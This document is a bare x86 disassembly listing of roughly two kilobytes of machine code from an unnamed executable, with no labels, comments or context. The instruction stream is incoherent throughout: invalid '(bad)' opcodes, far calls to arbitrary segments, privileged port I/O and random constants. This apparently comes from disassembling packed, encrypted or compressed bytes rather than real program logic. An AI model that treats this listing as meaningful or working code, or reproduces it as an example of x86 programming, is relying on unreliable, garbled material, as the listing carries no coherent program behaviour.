  407914:	repz push es
  407916:	(bad)  
  407917:	call   0xc6e3:0x9dbd8d80
  40791e:	lea    edi,[ebx+0x5467b672]
  407924:	cli    
  407925:	(bad)  
  407926:	call   0x2e6:0x6847fdab
  40792d:	and    cl,BYTE PTR [esi-0x7d4d4898]
  407933:	enter  0xff3d,0x62
  407937:	add    BYTE PTR [ebx-0x73],bh
  40793a:	mov    ?,eax
  40793c:	and    eax,0x8be42c3d
  407941:	adc    eax,0x532b1c9f
  407946:	outs   dx,DWORD PTR ds:[esi]
  407947:	xor    eax,0x92ce5101
  40794d:	addr16 mov cl,0x7
  407950:	jle    0x407902
  407952:	repz add BYTE PTR [edi],dl
  407955:	mov    dh,0x54
  407957:	sub    eax,0x1b6bf988
  40795c:	imul   esi,DWORD PTR [ecx+0x74],0x645e4477
  407963:	inc    eax
  407964:	call   0x22702ae5
  407969:	lahf   
  40796a:	in     al,dx
  40796b:	push   esp
  40796c:	inc    ebp
  40796d:	push   ecx
  40796e:	popa   
  40796f:	mov    esi,ds
  407971:	push   esp
  407972:	add    bh,0x62
  407975:	shl    BYTE PTR [ebx],1
  407977:	dec    ebp
  407978:	xchg   esp,eax
  407979:	mov    edx,0xb8c73dd1
  40797e:	jae    0x407939
  407980:	xchg   edi,eax
  407981:	das    
  407982:	xor    al,dl
  407984:	or     cl,BYTE PTR [esi-0x4331f346]
  40798a:	dec    ebp
  40798b:	stc    
  40798c:	cmp    ecx,DWORD PTR [edx]
  40798e:	and    DWORD PTR [edi+0xd],edi
  407991:	sub    BYTE PTR [edi],0xb2
  407994:	bound  ebx,QWORD PTR [edi+0x321ca1fd]
  40799a:	cmp    ah,BYTE PTR ds:0xcdb1b83
  4079a0:	xor    al,0x32
  4079a2:	push   ds
  4079a3:	into   
  4079a4:	int3   
  4079a5:	lea    edi,[eax]
  4079a7:	sahf   
  4079a8:	mov    ah,BYTE PTR [ebp+ebp*4-0x2ebd41ef]
  4079af:	xor    esi,DWORD PTR [ebp+0x1374e658]
  4079b5:	es das 
  4079b7:	mov    eax,0x3db81427
  4079bc:	dec    ebx
  4079bd:	xchg   esp,eax
  4079be:	push   ds
  4079bf:	push   esi
  4079c0:	or     BYTE PTR fs:[edx+0x5a653bcc],ah
  4079c7:	pop    eax
  4079c8:	outs   dx,DWORD PTR ds:[esi]
  4079c9:	jno    0x4079fd
  4079cb:	xchg   ch,ah
  4079cd:	fisubr WORD PTR [ecx]
  4079cf:	int    0xe2
  4079d1:	or     DWORD PTR [eax],edx
  4079d3:	into   
  4079d4:	ins    BYTE PTR es:[edi],dx
  4079d5:	mov    al,0x30
  4079d7:	(bad)  
  4079d8:	push   edi
  4079d9:	xchg   ebx,eax
  4079da:	jge    0x4079f5
  4079dc:	inc    DWORD PTR [eax+0x25048713]
  4079e2:	stos   BYTE PTR es:[edi],al
  4079e3:	inc    esp
  4079e4:	sti    
  4079e5:	pusha  
  4079e6:	in     eax,dx
  4079e7:	lea    esp,[eax-0x1]
  4079ea:	call   0x64ddcb41
  4079ef:	push   0xffffffa0
  4079f1:	fsubrp st(0),st
  4079f3:	push   ss
  4079f4:	leave  
  4079f5:	pop    esi
  4079f6:	or     bh,BYTE PTR [edx]
  4079f8:	dec    edx
  4079f9:	enter  0x1e75,0x24
  4079fd:	mov    ds:0x3c218321,eax
  407a02:	ror    esp,0x2
  407a05:	add    eax,ebx
  407a07:	test   BYTE PTR [edi-0x55],dh
  407a0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a0b:	ss pop ebx
  407a0d:	outs   dx,DWORD PTR ds:[esi]
  407a0e:	stc    
  407a0f:	shl    BYTE PTR [eax-0x482f67be],1
  407a15:	push   edx
  407a16:	sbb    DWORD PTR [eax-0x6d],ebp
  407a19:	mov    esp,0xd048d935
  407a1e:	(bad)  
  407a1f:	icebp  
  407a20:	xchg   edx,eax
  407a21:	mov    esi,0x9e3f03b0
  407a26:	call   0x30c9:0x142a7944
  407a2d:	pop    eax
  407a2e:	inc    eax
  407a2f:	faddp  st(6),st
  407a31:	push   es
  407a32:	jbe    0x407a55
  407a34:	add    al,0x9f
  407a36:	jns    0x4079d3
  407a38:	pop    edi
  407a39:	mov    WORD PTR [edx],es
  407a3b:	scas   eax,DWORD PTR es:[edi]
  407a3c:	icebp  
  407a3d:	sahf   
  407a3e:	or     BYTE PTR [edi+0x5d753b08],0x3d
  407a45:	jge    0x407a0f
  407a47:	cwde   
  407a48:	pusha  
  407a49:	add    al,0x94
  407a4b:	or     ah,dl
  407a4d:	call   0x58dc:0xb1e22658
  407a54:	cmp    bh,BYTE PTR [eax+0xef8131]
  407a5a:	adc    DWORD PTR es:[ebx],edi
  407a5d:	push   ebx
  407a5e:	jo     0x407a1f
  407a60:	and    al,0xe6
  407a62:	rcr    BYTE PTR [esi+0x518498c3],1
  407a68:	push   edx
  407a69:	retf   
  407a6a:	das    
  407a6b:	mov    dl,0xd8
  407a6d:	bound  ebp,QWORD PTR [esi]
  407a6f:	mov    eax,ds:0x2f93f635
  407a74:	add    ah,BYTE PTR [esi+0x1a]
  407a77:	pop    ebx
  407a78:	retf   0x683f
  407a7b:	je     0x407a2e
  407a7d:	sbb    al,al
  407a7f:	and    BYTE PTR [edx+edi*2-0x68dfdee2],ah
  407a86:	dec    edx
  407a87:	call   0x254a2b4f
  407a8c:	scas   al,BYTE PTR es:[edi]
  407a8d:	sub    DWORD PTR [eax+0x5da8a850],edi
  407a93:	cmp    DWORD PTR [ebx+0x4f6bc1dd],edx
  407a99:	jle    0x407a40
  407a9b:	test   DWORD PTR [ebx],ebx
  407a9d:	repz mov ebp,0x231702e5
  407aa3:	popf   
  407aa4:	or     esp,ebp
  407aa6:	ins    BYTE PTR es:[edi],dx
  407aa7:	cdq    
  407aa8:	ret    0xacce
  407aab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407aac:	stos   DWORD PTR es:[edi],eax
  407aad:	xchg   edx,eax
  407aae:	dec    edi
  407aaf:	dec    ebp
  407ab0:	inc    edi
  407ab1:	(bad)  
  407ab2:	adc    eax,ecx
  407ab4:	out    dx,al
  407ab5:	sti    
  407ab6:	outs   dx,DWORD PTR ds:[esi]
  407ab7:	xchg   ecx,eax
  407ab8:	dec    edi
  407ab9:	xor    DWORD PTR [ebx-0x38e8372d],ecx
  407abf:	jle    0x407a65
  407ac1:	mov    DWORD PTR [eax-0x5],ebp
  407ac4:	out    0x53,al
  407ac6:	imul   esi,DWORD PTR [ebp+0x1bf5fb28],0x26
  407acd:	adc    ebx,ecx
  407acf:	lea    edi,[edi-0x6d05f346]
  407ad5:	jmp    0xa45ef614
  407ada:	ret    0x3522
  407add:	sub    edi,DWORD PTR [esi-0x47]
  407ae0:	push   esp
  407ae1:	xchg   edx,ebx
  407ae3:	pop    eax
  407ae4:	pop    ss
  407ae5:	mov    ebx,0x9a54f1a3
  407aea:	stos   BYTE PTR es:[edi],al
  407aeb:	cld    
  407aec:	sahf   
  407aed:	sahf   
  407aee:	(bad)  
  407aef:	out    dx,eax
  407af0:	dec    edi
  407af1:	xchg   BYTE PTR [esi],dh
  407af3:	add    esp,DWORD PTR [esi]
  407af5:	sbb    eax,0xb594505f
  407afa:	cmc    
  407afb:	pop    ds
  407afc:	rcl    BYTE PTR [ebp*1-0x6d554500],cl
  407b03:	mul    esp
  407b05:	push   edi
  407b06:	xor    dh,bl
  407b08:	dec    esp
  407b09:	xchg   BYTE PTR [edi-0x174ccb49],cl
  407b0f:	inc    eax
  407b10:	or     DWORD PTR [edx],eax
  407b12:	mov    dl,0x29
  407b14:	test   esp,esp
  407b16:	mov    DWORD PTR ds:0x588750a,ecx
  407b1c:	in     al,0xb4
  407b1e:	in     eax,dx
  407b1f:	and    esp,ecx
  407b21:	sbb    dh,BYTE PTR [eax]
  407b23:	stos   DWORD PTR es:[edi],eax
  407b24:	iret   
  407b25:	mov    edi,0xd7dd7066
  407b2a:	dec    esi
  407b2b:	icebp  
  407b2c:	inc    ebp
  407b2d:	pop    eax
  407b2e:	jae    0x407b8f
  407b30:	xchg   BYTE PTR [ebx],al
  407b32:	and    bh,BYTE PTR [edx-0x66c54c5d]
  407b38:	mov    al,0x4a
  407b3a:	scas   eax,DWORD PTR es:[edi]
  407b3b:	push   cs
  407b3c:	pop    ebx
  407b3d:	jmp    0x407b87
  407b3f:	add    BYTE PTR [edi+0x1b90f5a0],ah
  407b45:	jle    0x407bad
  407b47:	xlat   BYTE PTR ds:[ebx]
  407b48:	fld    TBYTE PTR [edx+0x17d06df3]
  407b4e:	add    bl,dh
  407b50:	(bad)  
  407b52:	jg     0x407af8
  407b54:	cdq    
  407b55:	imul   ebx,esi,0xb1dd78ff
  407b5b:	or     BYTE PTR [ebx+0x11073d80],cl
  407b61:	lahf   
  407b62:	pop    ebx
  407b63:	lock or eax,0x790bcc00
  407b69:	shl    BYTE PTR [ebx+0x28b3638f],0x5d
  407b70:	scas   al,BYTE PTR es:[edi]
  407b71:	cmp    BYTE PTR [ebx],ah
  407b73:	out    0x7d,eax
  407b75:	adc    BYTE PTR [ebp+ebx*8+0x2c475a45],ch
  407b7c:	and    al,0xaf
  407b7e:	mov    ch,0x42
  407b80:	jnp    0x407b42
  407b82:	sbb    edi,DWORD PTR [edx+0x7f132ffb]
  407b88:	xchg   edx,eax
  407b89:	ror    al,0xb4
  407b8c:	in     al,dx
  407b8d:	sbb    ah,bh
  407b8f:	mov    ch,al
  407b91:	push   ecx
  407b92:	pop    esp
  407b93:	hlt    
  407b94:	mov    eax,0xad2e5e92
  407b99:	leave  
  407b9a:	leave  
  407b9b:	mul    DWORD PTR [edi-0x6f]
  407b9e:	dec    ebp
  407b9f:	mov    al,ds:0xb82d1656
  407ba4:	call   0x529a:0x9b1db499
  407bab:	mov    dl,0x76
  407bad:	lahf   
  407bae:	test   al,0x5d
  407bb0:	(bad)  
  407bb1:	xor    eax,0x2cff79c
  407bb6:	mov    ds,WORD PTR [esi+ebp*4-0x15]
  407bba:	ins    DWORD PTR es:[edi],dx
  407bbb:	or     eax,0x147aebf5
  407bc0:	xor    bl,BYTE PTR [ebp-0x4b]
  407bc3:	(bad)  
  407bc4:	stc    
  407bc5:	sbb    BYTE PTR [esi],cl
  407bc7:	out    dx,eax
  407bc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bc9:	ret    0x6d6b
  407bcc:	shl    BYTE PTR [eax+0x66],1
  407bcf:	dec    ebx
  407bd0:	mov    ds:0x2e0f5568,eax
  407bd5:	(bad)  
  407bd6:	dec    ecx
  407bd7:	scas   eax,DWORD PTR es:[edi]
  407bd8:	std    
  407bd9:	or     eax,0xb7f0171a
  407bde:	imul   eax,DWORD PTR [ebx],0xfffffff9
  407be1:	push   eax
  407be2:	in     al,0xb1
  407be4:	cmp    al,0xa9
  407be6:	fisttp WORD PTR [edx]
  407be8:	mov    edi,0x591fa228
  407bed:	lods   al,BYTE PTR ds:[esi]
  407bee:	mov    esi,0x70cf59d3
  407bf3:	push   0x52d848b5
  407bf8:	repnz rcl DWORD PTR [ecx+0x28857cd1],1
  407bff:	dec    ebp
  407c00:	lods   eax,DWORD PTR ds:[esi]
  407c01:	push   cs
  407c02:	pushf  
  407c03:	dec    ecx
  407c04:	or     ebx,DWORD PTR [ecx-0x39]
  407c07:	add    BYTE PTR [esi-0x56],bh
  407c0a:	retf   0xc155
  407c0d:	inc    eax
  407c0e:	out    dx,al
  407c0f:	mov    ds,WORD PTR [edx-0x71]
  407c12:	pop    ds
  407c13:	mov    ebx,0xb1060ee1
  407c18:	clc    
  407c19:	in     eax,dx
  407c1a:	inc    bp
  407c1c:	nop
  407c1d:	or     edx,DWORD PTR [edx-0x557a8b2e]
  407c23:	ret    0x3acb
  407c26:	cmp    ebp,ebx
  407c28:	xchg   esp,eax
  407c29:	iret   
  407c2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c2b:	sbb    esi,edx
  407c2d:	pop    ebx
  407c2e:	xchg   DWORD PTR [esi-0x5c6ebc3],edx
  407c34:	and    ebx,eax
  407c36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c37:	aaa    
  407c38:	mov    bh,0x73
  407c3a:	mov    al,0x74
  407c3c:	mov    ds,WORD PTR [eax]
  407c3e:	add    BYTE PTR [eax-0x15bf2c6],dl
  407c44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c45:	xor    eax,0x1e95f088
  407c4a:	retf   0xb31a
  407c4d:	cmp    dh,ah
  407c4f:	mov    ds:0x1416678,eax
  407c54:	fsubr  st,st(6)
  407c56:	push   ebp
  407c57:	lods   eax,DWORD PTR ds:[esi]
  407c58:	push   cs
  407c59:	js     0x407cad
  407c5b:	xor    dl,BYTE PTR [edi]
  407c5d:	shl    BYTE PTR [edi+0x29],0xf0
  407c61:	rcr    DWORD PTR [ebp-0x6e],1
  407c64:	mov    DWORD PTR fs:[ecx+0x4a4e34f8],eax
  407c6b:	mov    ch,BYTE PTR [edx+0x2a]
  407c6e:	dec    ebp
  407c6f:	sar    BYTE PTR [edx+0x6d],cl
  407c72:	cmp    eax,0x67fd2663
  407c77:	push   edx
  407c78:	sar    BYTE PTR [edx+0x6eeb22fb],cl
  407c7e:	ror    DWORD PTR [edi],cl
  407c80:	les    edx,FWORD PTR [edx*4-0x4da3e0d]
  407c87:	jae    0x407c4d
  407c89:	mov    ah,0x49
  407c8b:	jl     0x407cbb
  407c8d:	(bad)  
  407c8e:	data16 xor BYTE PTR [ebx+0x3ec9280f],ah
  407c95:	imul   ebp,DWORD PTR [esi+0x55],0x19
  407c99:	fnsave [ecx+ebp*2]
  407c9c:	mov    al,ds:0xf6c7900b
  407ca1:	fwait
  407ca2:	in     al,0xfd
  407ca4:	pop    esp
  407ca5:	into   
  407ca6:	in     al,dx
  407ca7:	dec    eax
  407ca8:	sub    edx,DWORD PTR [esi+0x27]
  407cab:	xor    al,0x3a
  407cad:	imul   edx,ebx,0xddd1cd8
  407cb3:	add    BYTE PTR [ebx],ch
  407cb5:	scas   al,BYTE PTR es:[edi]
  407cb6:	push   es
  407cb7:	repnz xor ah,0x7b
  407cbb:	xchg   ecx,eax
  407cbc:	outs   dx,DWORD PTR ds:[esi]
  407cbd:	ja     0x407d09
  407cbf:	mov    edx,0x1ef9c722
  407cc4:	outs   dx,BYTE PTR ds:[esi]
  407cc5:	xor    BYTE PTR ds:0xd5b0efc1,bl
  407ccb:	nop
  407ccc:	lods   eax,DWORD PTR ds:[esi]
  407ccd:	adc    eax,0x9dabd22e
  407cd2:	pop    esp
  407cd3:	std    
  407cd4:	(bad)  
  407cd5:	xlat   BYTE PTR ds:[ebx]
  407cd6:	cmp    dh,BYTE PTR [ebx-0xe3147]
  407cdc:	jg     0x407d49
  407cde:	mov    bl,0x1f
  407ce0:	mov    BYTE PTR [ecx+0x26f3523f],dl
  407ce6:	aam    0x28
  407ce8:	pop    esi
  407ce9:	sbb    ah,BYTE PTR [edi-0x5f]
  407cec:	aad    0xed
  407cee:	out    0xc2,eax
  407cf0:	dec    esi
  407cf1:	lods   eax,DWORD PTR ds:[esi]
  407cf2:	add    DWORD PTR [ebx+edi*2],eax
  407cf5:	push   esp
  407cf7:	add    BYTE PTR [edi+0x64],0xf2
  407cfb:	dec    esp
  407cfc:	out    0xf8,eax
  407cfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cff:	jo     0x407cf4
  407d01:	inc    edx
  407d02:	adc    eax,0xfb9e3e52
  407d07:	mov    BYTE PTR [edi-0x450831f5],al
  407d0d:	popf   
  407d0e:	xor    eax,0x7737317b
  407d13:	ss adc al,0xf4
  407d16:	adc    BYTE PTR [edi],cl
  407d18:	sub    ebx,DWORD PTR ds:0xb7f1c0c9
  407d1e:	push   edx
  407d1f:	imul   eax,DWORD PTR [edi+0x175f9d42],0x467dfd27
  407d29:	stos   DWORD PTR es:[edi],eax
  407d2a:	push   eax
  407d2b:	or     dl,0x9c
  407d2e:	arpl   WORD PTR [ebx],di
  407d30:	mov    ebx,0xa674fa83
  407d35:	push   ds
  407d36:	mov    edx,0x1c23322c
  407d3b:	push   ss
  407d3c:	test   al,0x79
  407d3e:	push   ds
  407d3f:	mov    edi,0xf62f4940
  407d44:	xor    eax,0xfb8f71f4
  407d49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d4a:	mov    edi,0xd8b6df1b
  407d4f:	in     al,0x5c
  407d51:	out    dx,al
  407d52:	daa    
  407d53:	and    BYTE PTR [edx-0x69b5288e],0x42
  407d5a:	or     al,BYTE PTR [edi]
  407d5c:	in     al,dx
  407d5d:	pop    ebp
  407d5e:	and    ecx,DWORD PTR [esi]
  407d60:	sar    DWORD PTR [eax+0x58],cl
  407d63:	arpl   WORD PTR [esi-0x6d],bx
  407d66:	adc    ebp,DWORD PTR [edi+eax*8+0xb1ce74f]
  407d6d:	gs add eax,0x1aaa78d2
  407d73:	xchg   esp,eax
  407d74:	xor    al,0xf5
  407d76:	out    0xd8,al
  407d78:	xchg   ebp,eax
  407d79:	push   eax
  407d7a:	(bad)  
  407d7b:	in     al,dx
  407d7c:	sub    al,0x20
  407d7e:	cmp    ebp,DWORD PTR [edi+0x70fe3a0]
  407d84:	pop    ebx
  407d85:	pop    eax
  407d86:	push   0x1feaa64d
  407d8b:	xchg   DWORD PTR [esi],edx
  407d8d:	cmp    DWORD PTR [edx],ebx
  407d8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d90:	add    edi,DWORD PTR [ebx+ebp*1]
  407d93:	pop    eax
  407d94:	pop    ebp
  407d95:	dec    ecx
  407d96:	dec    esi
  407d97:	add    bl,BYTE PTR [esi+0x1]
  407d9a:	pop    ecx
  407d9b:	push   ebp
  407d9c:	pandn  mm1,QWORD PTR [esi]
  407d9f:	mov    ebp,0x2bae183
  407da4:	xor    eax,0xd2e925cb
  407da9:	lods   eax,DWORD PTR ds:[esi]
  407daa:	out    dx,eax
  407dab:	outs   dx,BYTE PTR ds:[esi]
  407dac:	and    esp,edx
  407dae:	xor    bh,al
  407db0:	push   0x23f68116
  407db5:	jp     0x407d9c
  407db7:	out    0xa2,al
  407db9:	lock mov al,0x5
  407dbc:	idiv   BYTE PTR [edi]
  407dbe:	adc    BYTE PTR ds:0x211abc40,bl
  407dc4:	jl     0x407d97
  407dc6:	mov    ecx,0x63280e3
  407dcb:	arpl   WORD PTR [edi],ax
  407dcd:	jg     0x407e0b
  407dcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dd0:	jecxz  0x407d6b
  407dd2:	into   
  407dd3:	out    dx,eax
  407dd4:	dec    ebx
  407dd5:	sbb    eax,0xf7451baa
  407dda:	cmp    eax,0xc09585ec
  407ddf:	test   DWORD PTR [edx+0x7abfcd71],ebx
  407de5:	mov    WORD PTR [edi+esi*2+0x359cc531],fs
  407dec:	pop    esi
  407ded:	aas    
  407dee:	sahf   
  407def:	ret    
  407df0:	xlat   BYTE PTR ds:[ebx]
  407df1:	mov    ch,0x12
  407df3:	pop    eax
  407df4:	mov    eax,0xb25e2a73
  407df9:	cmc    
  407dfa:	shl    esi,cl
  407dfc:	pop    esi
  407dfd:	mov    dl,0x87
  407dff:	test   DWORD PTR [ebx],ecx
  407e01:	push   ebp
  407e02:	pop    edi
  407e03:	sub    DWORD PTR [ebx+0x3890e8d2],ecx
  407e09:	mov    ecx,0x3fb2a033
  407e0e:	pop    ebx
  407e0f:	hlt    
  407e10:	pop    eax
  407e11:	mov    esi,DWORD PTR [edi]
  407e13:	xor    eax,0xd0b8d6b1
  407e18:	xor    DWORD PTR ds:0xded96652,0xe7c38208
  407e22:	sub    al,0x41
  407e24:	sbb    bh,BYTE PTR ds:0x7f7b3a0d
  407e2a:	(bad)  
  407e2b:	hlt    
  407e2c:	cmp    BYTE PTR [ecx+0x4a37694d],dl
  407e32:	add    DWORD PTR [eax+0x1dd7cbe3],0x7c7817ae
  407e3c:	mov    al,BYTE PTR [edi+0x30a87dc3]
  407e42:	nop
  407e43:	out    dx,eax
  407e44:	test   eax,0x2b89bc85
  407e49:	sti    
  407e4a:	shl    al,1
  407e4c:	mov    dh,0x7e
  407e4e:	and    ah,ah
  407e50:	addr16 mov al,ds:0xdd81
  407e54:	test   DWORD PTR [edx+0x39],0x1aa1397b
  407e5b:	pop    esi
  407e5c:	mov    ds:0x2f07d446,al
  407e61:	adc    eax,0xd96cff62
  407e66:	pop    edi
  407e67:	or     BYTE PTR [edi-0x4e871427],ah
  407e6d:	xchg   esp,eax
  407e6e:	test   BYTE PTR [esi+ebx*8],dh
  407e71:	push   0x8b62f1d0
  407e76:	xchg   DWORD PTR [edi],ebx
  407e78:	popf   
  407e79:	adc    DWORD PTR [ecx],ecx
  407e7b:	mov    bl,0x67
  407e7d:	mov    esp,0x94968500
  407e82:	jno    0x407eba
  407e84:	push   ss
  407e85:	call   0xaa19:0x1a775822
  407e8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e8d:	push   ss
  407e8e:	fs in  al,0x5f
  407e91:	mov    bl,0xa6
  407e93:	fistp  QWORD PTR [eax]
  407e95:	fisubr WORD PTR [eax+edi*2+0x31]
  407e99:	aad    0xc2
  407e9b:	push   cs
  407e9c:	sub    DWORD PTR [esi+0x75a7f4d5],eax
  407ea2:	mov    BYTE PTR [ebp+edi*4-0x774f0e64],dh
  407ea9:	inc    esp
  407eaa:	cmp    BYTE PTR [ecx-0x2b5119be],cl
  407eb0:	dec    esi
  407eb1:	retf   0xe3f3
  407eb4:	or     BYTE PTR [edx+0xf8c2f4d],0x5c
  407ebb:	repnz push edx
  407ebd:	sbb    dl,BYTE PTR ss:[ebx-0x17]
  407ec1:	into   
  407ec2:	sahf   
  407ec3:	inc    ebp
  407ec4:	inc    ecx
  407ec5:	or     BYTE PTR [eax],ah
  407ec7:	jge    0x407e7b
  407ec9:	add    al,0xbc
  407ecb:	fiadd  DWORD PTR [eax+0x18cbf05]
  407ed1:	push   0x54
  407ed3:	popf   
  407ed4:	cmp    al,0x1f
  407ed6:	inc    ecx
  407ed8:	hlt    
  407ed9:	(bad)  
  407edb:	aad    0xd9
  407edd:	push   eax
  407ede:	ja     0x407f59
  407ee0:	push   ss
  407ee1:	mov    ch,0x18
  407ee3:	sbb    bl,dh
  407ee5:	out    dx,al
  407ee6:	jnp    0x407f1a
  407ee8:	xchg   edx,eax
  407ee9:	jl     0x407ef5
  407eeb:	(bad)  
  407eec:	cwde   
  407eed:	sahf   
  407eee:	nop
  407eef:	fs sub eax,edx
  407ef2:	mov    al,0xbf
  407ef4:	jae    0x407ecc
  407ef6:	and    edx,esp
  407ef8:	mov    dh,0xc6
  407efa:	pushf  
  407efb:	push   edi
  407efc:	sub    eax,0x8efba1b6
  407f01:	(bad)  
  407f02:	jmp    0x43b1:0xce1e7e5a
  407f09:	pop    edx
  407f0a:	dec    eax
  407f0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f0c:	inc    esi
  407f0d:	dec    esi
  407f0e:	xchg   edi,eax
  407f0f:	cmp    eax,0xdd4dc753
  407f14:	push   ebp
  407f15:	repnz adc edi,esi
  407f18:	mov    edx,0x4e9a99be
  407f1d:	xchg   ebp,eax
  407f1e:	aas    
  407f1f:	inc    ebp
  407f20:	aad    0x7
  407f22:	sbb    eax,DWORD PTR [ecx+0x669abc27]
  407f28:	cmp    eax,0x19843898
  407f2d:	jmp    0xece3ed95
  407f32:	js     0x407edb
  407f34:	hlt    
  407f35:	jle    0x407f54
  407f37:	cmp    eax,0x759d4e2b
  407f3c:	xor    ah,dl
  407f3e:	sub    al,0xa0
  407f40:	les    edx,FWORD PTR ds:0x9a3b0e00
  407f46:	shl    BYTE PTR [edx],1
  407f48:	jo     0x407f8b
  407f4a:	push   ss
  407f4b:	loop   0x407fa3
  407f4d:	xor    ah,dl
  407f4f:	adc    dl,BYTE PTR [ebx-0x90e19f7]
  407f55:	es jno 0x407f4d
  407f58:	inc    edx
  407f59:	xchg   DWORD PTR [edi],ebx
  407f5b:	in     al,0x4
  407f5d:	mov    al,ds:0x326218b9
  407f62:	sti    
  407f63:	daa    
  407f64:	sub    DWORD PTR [esi],0xffffffab
  407f67:	dec    esi
  407f68:	iret   
  407f69:	inc    edi
  407f6a:	mov    esp,0xf35a1852
  407f6f:	arpl   WORD PTR [edx-0x49],sp
  407f72:	cld    
  407f73:	pop    ds
  407f74:	daa    
  407f75:	out    0xa1,al
  407f77:	outs   dx,BYTE PTR ds:[esi]
  407f78:	shl    al,1
  407f7a:	imul   ebp,DWORD PTR [edi-0x1c],0xc
  407f7e:	outs   dx,DWORD PTR ds:[esi]
  407f7f:	imul   edx,DWORD PTR [ebp-0x49],0x94cdb4ba
  407f86:	repnz adc edi,DWORD PTR fs:[eax-0x6a80200f]
  407f8e:	pcmpeqd mm3,mm3
  407f91:	ins    BYTE PTR es:[edi],dx
  407f92:	cmp    bh,BYTE PTR [eax+0x7263df09]
  407f98:	cs jae 0x407fc0
  407f9b:	sub    cl,BYTE PTR fs:[ebx]
  407f9e:	dec    esp
  407f9f:	in     al,dx
  407fa0:	pop    esp
  407fa1:	nop
  407fa2:	les    ebp,FWORD PTR [esi]
  407fa4:	dec    ebp
  407fa5:	cld    
  407fa6:	jl     0x407f65
  407fa8:	jns    0x407fb2
  407faa:	adc    eax,0x6b8927a0
  407faf:	sti    
  407fb0:	add    eax,0x7cb67368
  407fb5:	test   eax,0x1c656a18
  407fba:	cmp    al,0xb5
  407fbc:	xor    BYTE PTR [ebx],dh
  407fbe:	xor    esi,ebx
  407fc0:	aas    
  407fc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fc2:	sbb    esp,DWORD PTR [ebp+0x5e9ef419]
  407fc8:	(bad)  
  407fca:	inc    esi
  407fcb:	dec    edi
  407fcc:	pop    esp
  407fcd:	push   ss
  407fce:	and    esi,esi
  407fd0:	fcomp  QWORD PTR [edx+0x22]
  407fd3:	pusha  
  407fd4:	xchg   edx,eax
  407fd5:	outs   dx,DWORD PTR ds:[esi]
  407fd6:	popa   
  407fd7:	pushf  
  407fd8:	shr    DWORD PTR [edx+0x2a],cl
  407fdb:	cmp    al,0xe
  407fdd:	imul   ebp,DWORD PTR [ecx-0x64825d80],0x26
  407fe4:	gs pop eax
  407fe6:	or     DWORD PTR [eax+ebp*1],esp
  407fe9:	rcr    ebx,cl
  407feb:	push   esi
  407fec:	ins    DWORD PTR es:[edi],dx
  407fed:	pop    ds
  407fee:	and    eax,0x60679652
  407ff3:	arpl   WORD PTR [edx-0x10],ax
  407ff6:	test   DWORD PTR [edx-0x41],esp
  407ff9:	mov    ecx,0x4e83658f
  407ffe:	and    BYTE PTR [edx+0x40344366],0xe0
  408005:	add    DWORD PTR [edi],edi
  408007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408008:	pop    edx
  408009:	addr16 out dx,eax
  40800b:	int3   
  40800c:	push   0xffffffaf
  40800e:	sub    BYTE PTR [edi-0xf],0x85
  408012:	mov    edx,0xde7e889d
  408017:	js     0x408061
  408019:	sub    al,0x5d
  40801b:	fsubr  DWORD PTR [ebp-0x6f]
  40801e:	in     al,dx
  40801f:	add    DWORD PTR [edi-0x31fbce0],edi
  408025:	sbb    esi,ebx
  408027:	cmp    al,0x6a
  408029:	pop    ebx
  40802a:	xor    eax,0x4c13780
  40802f:	lea    esp,[edx+0x5]
  408032:	push   0x30
  408034:	arpl   bx,si
  408036:	mov    bl,0xf2
  408038:	lahf   
  408039:	push   ecx
  40803a:	fwait
  40803b:	mov    eax,DWORD PTR [edi+0x44]
  40803e:	mov    dh,BYTE PTR [ecx-0x654d1905]
  408044:	jb     0x407fed
  408046:	shl    DWORD PTR ds:0x7fb8543d,1
  40804c:	daa    
  40804d:	aad    0x97
  40804f:	ss retf 0x47b1
  408053:	out    dx,al
  408054:	jo     0x408001
  408056:	in     al,dx
  408057:	sbb    BYTE PTR [ebx+0x2f73a032],al
  40805d:	punpckhbw mm3,QWORD PTR [esi+0x5a]
  408061:	jl     0x408054
  408063:	sahf   
  408064:	mov    dl,0x96
  408066:	pop    eax
  408067:	lea    ebx,[ebx-0x1e]
  40806a:	data16 sub al,BYTE PTR [ebp-0x72]
  40806e:	sbb    BYTE PTR [ecx-0x198217d0],dl
  408074:	jb     0x40803b
  408076:	scas   eax,DWORD PTR es:[edi]
  408077:	xchg   ecx,eax
  408078:	push   ss
  408079:	or     edi,eax
  40807b:	xor    al,BYTE PTR [esi-0x5f]
  40807e:	push   ecx
  40807f:	mov    ah,0x93
  408081:	push   ecx
  408082:	sub    DWORD PTR [edi+0x56bc3264],esi
  408088:	clc    
  408089:	or     al,BYTE PTR [ebp+0x16d16471]
  40808f:	ins    DWORD PTR es:[edi],dx
  408090:	popfw  
  408092:	adc    eax,0xc108c730
  408097:	pop    ebx
  408098:	dec    ecx
  408099:	cmp    dh,al
  40809b:	daa    
  40809c:	jmp    0x40803b
  40809e:	dec    edx
  40809f:	push   ds
  4080a0:	es xor eax,0x2995d70a
  4080a6:	xchg   DWORD PTR ds:0x42e4780b,edi
  4080ac:	jo     0x408072
  4080ae:	and    BYTE PTR [esi-0x21],al
  4080b1:	add    ch,BYTE PTR [ecx+0x28fd353]
  4080b7:	and    DWORD PTR [eax],edx
  4080b9:	and    DWORD PTR [eax+eax*1],ecx
  4080bc:	repz xchg ebp,eax
  4080be:	mov    BYTE PTR [eax],cl
  4080c0:	out    dx,eax
  4080c1:	xchg   esi,eax
  4080c2:	pop    eax
  4080c3:	imul   edi,DWORD PTR [edi],0x1a
  4080c6:	mov    ah,0x8c
  4080c8:	ret    0x6364
  4080cb:	sbb    bh,al
